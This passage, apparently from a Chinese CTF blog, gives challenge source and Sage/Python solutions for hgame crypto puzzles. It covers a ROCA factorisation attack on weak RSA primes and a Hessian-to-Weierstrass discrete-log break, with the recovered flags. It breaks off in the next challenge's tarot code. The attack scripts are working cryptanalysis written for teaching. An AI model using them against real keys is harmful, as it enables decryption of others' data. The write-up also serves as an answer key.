class="hljs-literal">True</span>:<br>        k = getPrime(random.randint(<span class="hljs-number">20</span>,<span class="hljs-number">40</span>)) <span class="hljs-comment">#20 &lt;= k &lt;= 40</span><br>        a = getPrime(random.randint(<span class="hljs-number">20</span>,<span class="hljs-number">60</span>)) <span class="hljs-comment">#20 &lt;= k &lt;= 60</span><br>        p = k * M + <span class="hljs-built_in">pow</span>(e, a, M)            <span class="hljs-comment">#p=kM + 65537^a mod M</span><br>        <span class="hljs-keyword">if</span> isPrime(p):                      <span class="hljs-comment">#确保p是素数</span><br>            <span class="hljs-keyword">return</span> p<br><br>p,q=gen_key(),gen_key()<br>n=p*q<br>m=bytes_to_long(FLAG)           <br>enc=<span class="hljs-built_in">pow</span>(m,e,n)                              <span class="hljs-comment">#简单RSA</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;n=&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;enc=&#125;</span>&#x27;</span>)<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">n=787190064146025392337631797277972559696758830083248285626115725258876808514690830730702705056550628756290183000265129340257928314614351263713241</span><br><span class="hljs-string">enc=365164788284364079752299551355267634718233656769290285760796137651769990253028664857272749598268110892426683253579840758552222893644373690398408</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>可以看到$p&#x3D;kM+65537^a \mod M$,其中M 是前 n 个连续素数的乘积，n 是仅取决于所需密钥大小的常数，这种素数生成形式会受到<strong>ROCA攻击</strong>。</p><p>我这里直接使用ROCA的sagemath脚本进行解答，当然也可以使用neca工具。</p><p><strong>解答：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-comment">## Coppersmith-howgrave</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">coppersmith_howgrave</span>(<span class="hljs-params">f, N, beta, m, t, R</span>):<br>    <span class="hljs-comment">#Check if parameters are within bounds</span><br>    <span class="hljs-keyword">assert</span> <span class="hljs-number">0</span> &lt; beta &lt;= <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;beta not in (0, 1]&#x27;</span><br>    <span class="hljs-keyword">assert</span> f.is_monic(), <span class="hljs-string">&#x27;f is not monic&#x27;</span><br><br>    <span class="hljs-comment">#get delta and the matrix dimension</span><br>    delta = f.degree()<br>    n = delta * m + t<br><br>    <span class="hljs-comment">#Building the polynomials</span><br>    fZ = f.change_ring(ZZ) <span class="hljs-comment">#change the ring from Zmod(N) to ZZ</span><br>    x = fZ.parent().gen()  <span class="hljs-comment">#make x a variable in ZZ</span><br>    f_list = [] <br>    <span class="hljs-keyword">for</span> ii <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(m):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(delta):<br>            <span class="hljs-comment">#We want them ordered that&#x27;s we have N^(m-ii1) and fZ^ii</span><br>            f_list.append(((x*R)^j) * N^(m-ii) * fZ(x*R)^(ii)) <span class="hljs-comment">#the g_&#123;i,j&#125;</span><br>    <span class="hljs-keyword">for</span> ii <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(t):<br>        f_list.append((x*R)^ii * fZ(x*R)^m) <span class="hljs-comment">#the h_i</span><br><br>    <span class="hljs-comment">#Build the lattice</span><br>    B = matrix(ZZ, n) <span class="hljs-comment"># n = delta * m + t</span><br>    <span class="hljs-keyword">for</span> ii <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(ii+<span class="hljs-number">1</span>):<br>            B[ii, j] = f_list[ii][j]<br><br>    <span class="hljs-comment">#LLL it</span><br>    B_lll = B.LLL(early_red = <span class="hljs-literal">True</span>, use_siegel = <span class="hljs-literal">True</span>)<br><br>    <span class="hljs-comment">#take the shortest vector to construct our new poly g</span><br>    g = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> ii <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>        g += x^ii * B_lll[<span class="hljs-number">0</span>, ii] / R^ii<br><br>    <span class="hljs-comment">#factor the polynomial</span><br>    potential_roots = g.roots()<br>    <span class="hljs-comment">#print(&#x27;potential roots:&#x27;, potential_roots)</span><br><br>    <span class="hljs-comment">#we don&#x27;t need to do this Since our we test in our roca function</span><br><span class="hljs-comment">#     #test roots</span><br><span class="hljs-comment">#     roots = []</span><br><span class="hljs-comment">#     for r in potential_roots:</span><br><span class="hljs-comment">#         if r[0].is_integer():</span><br><span class="hljs-comment">#             res = fZ(ZZ(r[0]))</span><br><span class="hljs-comment">#             if gcd(N, res) &gt;= N^beta:</span><br><span class="hljs-comment">#                 roots.append(ZZ(r[0]))</span><br>    <span class="hljs-comment">#print(&#x27;roots:&#x27;, roots)</span><br>    <span class="hljs-keyword">return</span> potential_roots<br>    <span class="hljs-comment">#return roots</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">roca</span>(<span class="hljs-params">N, M_prime, g, m, t, beta</span>):<br>    g = <span class="hljs-built_in">int</span>(g)<br>    c_prime = discrete_log(Zmod(M_prime)(N), Zmod(M_prime)(g))<br>    ord_M_prime = Zmod(M_prime)(g).multiplicative_order()<br><br>    <span class="hljs-comment">#search boundaries</span><br>    bottom = c_prime // <span class="hljs-number">2</span> <br>    top =(c_prime + ord_M_prime) // <span class="hljs-number">2</span> <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;numbers to check&#x27;</span>,   top - bottom, <span class="hljs-string">&#x27; between &#x27;</span>, (bottom, top))<br><br><br>    <span class="hljs-comment">#constants for coppersmith</span><br>    P.&lt;x&gt; = PolynomialRing(Zmod(N))<br>    epsilon = beta / <span class="hljs-number">7</span><br>    X = floor(<span class="hljs-number">2</span> * N^beta / M_prime)<br><br>    <span class="hljs-comment">#the search</span><br>    <span class="hljs-keyword">for</span> i, a <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(<span class="hljs-built_in">range</span>(bottom, top)):<br>        <span class="hljs-keyword">if</span> i % <span class="hljs-number">1000</span> == <span class="hljs-number">0</span>: <span class="hljs-comment">#count iterations</span><br>            <span class="hljs-built_in">print</span>(i)<br><br>        <span class="hljs-comment">#construct polynomial</span><br>        f = x + <span class="hljs-built_in">int</span>((inverse_mod(M_prime, N)) * <span class="hljs-built_in">int</span>(<span class="hljs-built_in">pow</span>(g, a, M_prime)))<br><br>        <span class="hljs-comment">#roots = f.small_roots(X, beta, epsilon) #coppersmith</span><br>        roots = coppersmith_howgrave(f, N, beta, m, t, X)<br>        <span class="hljs-comment">#check solutions</span><br>        <span class="hljs-keyword">for</span> k_prime, _ <span class="hljs-keyword">in</span> roots:<br>            p = <span class="hljs-built_in">int</span>(k_prime * M_prime) + <span class="hljs-built_in">int</span>(<span class="hljs-built_in">pow</span>(g, a, M_prime))<br>            <span class="hljs-keyword">if</span> N % p == <span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">return</span> p, N//p<br>    <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span><br>n=<span class="hljs-number">787190064146025392337631797277972559696758830083248285626115725258876808514690830730702705056550628756290183000265129340257928314614351263713241</span><br>e=<span class="hljs-number">65537</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_M1_m_t_values</span>(<span class="hljs-params">key_size</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;111&quot;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-number">512</span> &lt;= key_size &lt; <span class="hljs-number">1024</span>:<br>        m = <span class="hljs-number">5</span><br>        M1=<span class="hljs-number">0x1b3e6c9433a7735fa5fc479ffe4027e13bea</span><br>    <span class="hljs-keyword">elif</span> <span class="hljs-number">1024</span> &lt;= key_size &lt; <span class="hljs-number">2048</span>:<br>        m = <span class="hljs-number">4</span><br>        M1=<span class="hljs-number">0x24683144f41188c2b1d6a217f81f12888e4e6513c43f3f60e72af8bd9728807483425d1e</span><br>    <span class="hljs-keyword">elif</span> <span class="hljs-number">2048</span> &lt;= key_size &lt; <span class="hljs-number">3072</span>:<br>        m = <span class="hljs-number">6</span><br>        M1=<span class="hljs-number">0x016928dc3e47b44daf289a60e80e1fc6bd7648d7ef60d1890f3e0a9455efe0abdb7a748131413cebd2e36a76a355c1b664be462e115ac330f9c13344f8f3d1034a02c23396e6</span><br>    <span class="hljs-keyword">elif</span> <span class="hljs-number">3072</span> &lt;= key_size &lt; <span class="hljs-number">4096</span>:<br>        m = <span class="hljs-number">25</span><br>    <span class="hljs-keyword">else</span>:<br>        m = <span class="hljs-number">7</span><br>    <span class="hljs-keyword">return</span> M1,m, m+<span class="hljs-number">1</span><br>M_prime,m, t = get_M1_m_t_values(<span class="hljs-number">512</span>)<br>p, q = roca(n, M_prime, e, m, t, <span class="hljs-number">.5</span>) <br><span class="hljs-keyword">assert</span>(p*q==n)<br>phi=(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d=gmpy2.invert(e,phi)<br>enc=<span class="hljs-number">365164788284364079752299551355267634718233656769290285760796137651769990253028664857272749598268110892426683253579840758552222893644373690398408</span><br>m=<span class="hljs-built_in">pow</span>(enc,d,n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br><br><span class="hljs-comment">#b&#x27;hgame&#123;ROCA_ROCK_and_ROll!&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="4-Intergalactic-Bound"><a href="#4-Intergalactic-Bound" class="headerlink" title="4.Intergalactic Bound"></a>4.Intergalactic Bound</h2><p><strong>题目：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> randint<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> secrets <span class="hljs-keyword">import</span> flag<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add_THCurve</span>(<span class="hljs-params">P, Q</span>):  <span class="hljs-comment">#曲线加法</span><br>    <span class="hljs-keyword">if</span> P == (<span class="hljs-number">0</span>, <span class="hljs-number">0</span>):<br>        <span class="hljs-keyword">return</span> Q<br>    <span class="hljs-keyword">if</span> Q == (<span class="hljs-number">0</span>, <span class="hljs-number">0</span>):<br>        <span class="hljs-keyword">return</span> P<br>    x1, y1 = P<br>    x2, y2 = Q<br>    x3 = (x1 - y1 ** <span class="hljs-number">2</span> * x2 * y2) * <span class="hljs-built_in">pow</span>(a * x1 * y1 * x2 ** <span class="hljs-number">2</span> - y2, -<span class="hljs-number">1</span>, p) % p<br>    y3 = (y1 * y2 ** <span class="hljs-number">2</span> - a * x1 ** <span class="hljs-number">2</span> * x2) * <span class="hljs-built_in">pow</span>(a * x1 * y1 * x2 ** <span class="hljs-number">2</span> - y2, -<span class="hljs-number">1</span>, p) % p<br>    <span class="hljs-keyword">return</span> x3, y3<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mul_THCurve</span>(<span class="hljs-params">n, P</span>):  <span class="hljs-comment">#曲线乘法</span><br>    R = (<span class="hljs-number">0</span>, <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">while</span> n &gt; <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">if</span> n % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>:<br>            R = add_THCurve(R, P)<br>        P = add_THCurve(P, P)<br>        n = n // <span class="hljs-number">2</span><br>    <span class="hljs-keyword">return</span> R<br><br><br>p = getPrime(<span class="hljs-number">96</span>)<br>a = randint(<span class="hljs-number">1</span>, p)<br>G = (randint(<span class="hljs-number">1</span>,p), randint(<span class="hljs-number">1</span>,p))<br>d = (a*G[<span class="hljs-number">0</span>]^<span class="hljs-number">3</span>+G[<span class="hljs-number">1</span>]^<span class="hljs-number">3</span>+<span class="hljs-number">1</span>)%p*inverse(G[<span class="hljs-number">0</span>]*G[<span class="hljs-number">1</span>],p)%p   <span class="hljs-comment">#d=(a * x0^3 + y0^3 + 1)modp * (x0*y0)^-1 modp </span><br>x = randint(<span class="hljs-number">1</span>, p)<br>Q = mul_THCurve(x, G)   <span class="hljs-comment">#Q=x*G</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;p = <span class="hljs-subst">&#123;p&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;G = <span class="hljs-subst">&#123;G&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Q = <span class="hljs-subst">&#123;Q&#125;</span>&quot;</span>)<br><br>key = hashlib.sha256(<span class="hljs-built_in">str</span>(x).encode()).digest()  <span class="hljs-comment">#分析可知，目的就是求出x</span><br>cipher = AES.new(key, AES.MODE_ECB)<br>flag = pad(flag,<span class="hljs-number">16</span>)<br>ciphertext = cipher.encrypt(flag)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ciphertext=<span class="hljs-subst">&#123;ciphertext&#125;</span>&quot;</span>)<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">p = 55099055368053948610276786301</span><br><span class="hljs-string">G = (19663446762962927633037926740, 35074412430915656071777015320)</span><br><span class="hljs-string">Q = (26805137673536635825884330180, 26376833112609309475951186883)</span><br><span class="hljs-string">ciphertext=b&quot;k\xe8\xbe\x94\x9e\xfc\xe2\x9e\x97\xe5\xf3\x04&#x27;\x8f\xb2\x01T\x06\x88\x04\xeb3Jl\xdd Pk$\x00:\xf5&quot;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>上网搜索可知道，THCurve的形式</p><span>$$ax^3+y^3+1=dxy$$</span><p>通过联立两个点，可以求出参数<code>a,d</code>。</p><p>然后想办法把曲线和点映射到椭圆曲线上，然后进行离散对数求解。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br><span class="hljs-comment">#THCurve曲线</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>p = <span class="hljs-number">55099055368053948610276786301</span>       <span class="hljs-comment">#模数p</span><br>G = (<span class="hljs-number">19663446762962927633037926740</span>, <span class="hljs-number">35074412430915656071777015320</span>)  <span class="hljs-comment">#已知点G</span><br>Q = (<span class="hljs-number">26805137673536635825884330180</span>, <span class="hljs-number">26376833112609309475951186883</span>)  <span class="hljs-comment">#已知点Q</span><br>ciphertext=<span class="hljs-string">b&quot;k\xe8\xbe\x94\x9e\xfc\xe2\x9e\x97\xe5\xf3\x04&#x27;\x8f\xb2\x01T\x06\x88\x04\xeb3Jl\xdd Pk$\x00:\xf5&quot;</span>   <span class="hljs-comment">#密文</span><br>Gx,Gy=G     <span class="hljs-comment">#提取G的x，y坐标</span><br>Qx,Qy=Q     <span class="hljs-comment">#提取Q的x，y坐标</span><br><br>M=matrix(GF(p),[[-Gx**<span class="hljs-number">3</span>,Gx*Gy],[-Qx**<span class="hljs-number">3</span>,Qx*Qy]]) <span class="hljs-comment">#构造2*2矩阵</span><br>y=vector(GF(p),[Gy**<span class="hljs-number">3</span>+<span class="hljs-number">1</span>,Qy**<span class="hljs-number">3</span>+<span class="hljs-number">1</span>])               <span class="hljs-comment">#构造向量</span><br>a,d=M.solve_right(y)                            <span class="hljs-comment">#求解线性方程组</span><br><span class="hljs-built_in">print</span>(a,d)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calculate_coefficients</span>(<span class="hljs-params">a, d</span>):<br>    d_3 = d*inverse(<span class="hljs-number">3</span>, p)%p             <span class="hljs-comment"># d / 3</span><br>    tmp = a - d_3**<span class="hljs-number">3</span>                    <span class="hljs-comment"># a - d^3/27</span><br>    a0 = <span class="hljs-number">1</span><br>    a1 = (-<span class="hljs-number">3</span> * d_3 * inverse(tmp, p))%p<br>    a3 = (-<span class="hljs-number">9</span> * inverse(tmp**<span class="hljs-number">2</span>, p)) % p<br>    a2 = (-<span class="hljs-number">9</span> * d_3**<span class="hljs-number">2</span> * inverse(tmp**<span class="hljs-number">2</span>, p))%p<br>    a4 = (-<span class="hljs-number">27</span> * d_3 * inverse(tmp**<span class="hljs-number">3</span>, p))%p<br>    a6 = (-<span class="hljs-number">27</span> * inverse(tmp**<span class="hljs-number">4</span>, p))%p<br><br>    <span class="hljs-keyword">return</span> [a1, a2, a3, a4, a6]<br><br>aa = calculate_coefficients(a, d)<br>E = EllipticCurve(GF(p), aa)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Herssian_to_Weierstrass</span>(<span class="hljs-params">Point</span>):<br>    x, y = Point<br>    u = ((-<span class="hljs-number">3</span> * inverse((a - d^<span class="hljs-number">3</span>*inverse(<span class="hljs-number">27</span>, p)), p)*x * inverse(d*x*inverse(<span class="hljs-number">3</span>,p) - (-y) + <span class="hljs-number">1</span>, p))) % p<br>    v = ((-<span class="hljs-number">9</span> * inverse((a - d^<span class="hljs-number">3</span>*inverse(<span class="hljs-number">27</span>, p))^<span class="hljs-number">2</span>, p) ) * (-y) * inverse(d*x*inverse(<span class="hljs-number">3</span>,p) - (-y) + <span class="hljs-number">1</span>, p))%p<br>    <span class="hljs-keyword">return</span> (u, v)<br><br><br>G = E(Herssian_to_Weierstrass(G))<br>Q = E(Herssian_to_Weierstrass(Q))<br>k = discrete_log(Q,G,operation=<span class="hljs-string">&#x27;+&#x27;</span>)<br><span class="hljs-built_in">print</span>(k)<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br>key=sha256(<span class="hljs-built_in">str</span>(k).encode()).digest()<br>aes=AES.new(key,AES.MODE_ECB)<br><span class="hljs-built_in">print</span>(aes.decrypt(ciphertext))<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">39081810733380615260725035189 8569490478014112404683314361</span><br><span class="hljs-string">2633177798829352921583206736</span><br><span class="hljs-string">b&#x27;hgame&#123;N0th1ng_bu7_up_Up_UP!&#125;\x04\x04\x04\x04&#x27;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><h2 id="5-Ancient-Recall"><a href="#5-Ancient-Recall" class="headerlink" title="5.Ancient Recall"></a>5.Ancient Recall</h2><p><strong>题目：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><br>Major_Arcana = [<span class="hljs-string">&quot;The Fool&quot;</span>, <span class="hljs-string">&quot;The Magician&quot;</span>, <span class="hljs-string">&quot;The High Priestess&quot;</span>,<span class="hljs-string">&quot;The Empress&quot;</span>, <span class="hljs-string">&quot;The Emperor&quot;</span>, <span class="hljs-string">&quot;The Hierophant&quot;</span>,<span class="hljs-string">&quot;The Lovers&quot;</span>, <span class="hljs-string">&quot;The Chariot&quot;</span>, <span class="hljs-string">&quot;Strength&quot;</span>,<span class="hljs-string">&quot;The Hermit&quot;</span>, <span class="hljs-string">&quot;Wheel of Fortune&quot;</span>, <span class="hljs-string">&quot;Justice&quot;</span>,<span class="hljs-string">&quot;The Hanged Man&quot;</span>, <span class="hljs-string">&quot;Death&quot;</span>, <span class="hljs-string">&quot;Temperance&quot;</span>,<span class="hljs-string">&quot;The Devil&quot;</span>, <span class="hljs-string">&quot;The Tower&quot;</span>, <span class="hljs-string">&quot;The Star&quot;</span>,<span class="hljs-string">&quot;The Moon&quot;</span>, <span class="hljs-string">&quot;The Sun&quot;</span>, <span class="hljs-string">&quot;Judgement&quot;</span>,<span class="hljs-string">&quot;The World&quot;</span>]<br>wands = [<span class="hljs-string">&quot;Ace of Wands&quot;</span>, <span class="hljs-string">&quot;Two of Wands&quot;</span>, <span class="hljs-string">&quot;Three of Wands&quot;</span>, <span class="hljs-string">&quot;Four of Wands&quot;</span>, <span class="hljs-string">&quot;Five of Wands&quot;</span>, <span class="hljs-string">&quot;Six of Wands&quot;</span>, <span class="hljs-string">&quot;Seven of Wands&quot;</span>, <span class="hljs-string">&quot;Eight of Wands&quot;</span>, <span class="hljs-string">&quot;Nine of Wands&quot;</span>, <span class="hljs-string">&quot;Ten of Wands&quot;</span>, <span class="hljs-string">&quot;Page of Wands&quot;</span>, <span class="hljs-string">&quot;Knight of Wands&quot;</span>, <span class="hljs-string">&quot;Queen of Wands&quot;</span>, <span class="hljs-string">&quot;King of Wands&quot;</span>]<br>cups = [<span class="hljs-string">&quot;Ace of Cups&quot;</span>, <span class="hljs-string">&quot;Two of Cups&quot;</span>, <span class="hljs-string">&quot;Three of Cups&quot;</span>, <span class="hljs-string">&quot;Four of Cups&quot;</span>, <span class="hljs-string">&quot;Five of Cups&quot;</span>, <span class="hljs-string">&quot;Six of Cups&quot;</span>, <span class="hljs-string">&quot;Seven of Cups&quot;</span>, <span class="hljs-string">&quot;Eight of Cups&quot;</span>, <span class="hljs-string">&quot;Nine of Cups&quot;</span>, <span class="hljs-string">&quot;Ten of Cups&quot;</span>, <span class="hljs-string">&quot;Page of Cups&quot;</span>, <span class="hljs-string">&quot;Knight of Cups&quot;</span>, <span class="hljs-string">&quot;Queen of Cups&quot;</span>, <span class="hljs-string">&quot;King of Cups&quot;</span>]<br>swords = [<span class="hljs-string">&quot;Ace of Swords&quot;</span>, <span class="hljs-string">&quot;Two of Swords&quot;</span>, <span class="hljs-string">&quot;Three of Swords&quot;</span>, <span class="hljs-string">&quot;Four of Swords&quot;</span>, <span class="hljs-string">&quot;Five of Swords&quot;</span>, <span class="hljs-string">&quot;Six of Swords&quot;</span>, <span class="hljs-string">&quot;Seven of Swords&quot;</span>, <span class="hljs-string">&quot;Eight of Swords&quot;</span>, <span class="hljs-string">&quot;Nine of Swords&quot;</span>, <span class="hljs-string">&quot;Ten of Swords&quot;</span>, <span class="hljs-string">&quot;Page of Swords&quot;</span>, <span class="hljs-string">&quot;Knight of Swords&quot;</span>, <span class="hljs-string">&quot;Queen of Swords&quot;</span>, <span class="hljs-string">&quot;King of Swords&quot;</span>]<br>pentacles = [<span class="hljs-string">&quot;Ace of Pentacles&quot;</span>, <span class="hljs-string">&quot;Two of Pentacles&quot;</span>, <span class="hljs-string">&quot;Three of Pentacles&quot;</span>, <span class="hljs-string">&quot;Four of Pentacles&quot;</span>, <span class="hljs-string">&quot;Five of Pentacles&quot;</span>, <span class="hljs-string">&quot;Six of Pentacles&quot;</span>, <span class="hljs-string">&quot;Seven of Pentacles&quot;</span>, <span class="hljs-string">&quot;Eight of Pentacles&quot;</span>, <span class="hljs-string">&quot;Nine of Pentacles&quot;</span>, <span class="hljs-string">&quot;Ten of Pentacles&quot;</span>, <span class="hljs-string">&quot;Page of Pentacles&quot;</span>, <span class="hljs-string">&quot;Knight of Pentacles&quot;</span>, <span class="hljs-string">&quot;Queen of Pentacles&quot;</span>, <span class="hljs-string">&quot;King of Pentacles&quot;</span>]<br>Minor_Arcana = wands + cups + swords + pentacles<br><span class="hljs-built_in">print</span>(Minor_Arcana)<br>tarot = Major_Arcana + Minor_Arcana<br>reversals = [<span class="hljs-number">0</span>,-<span 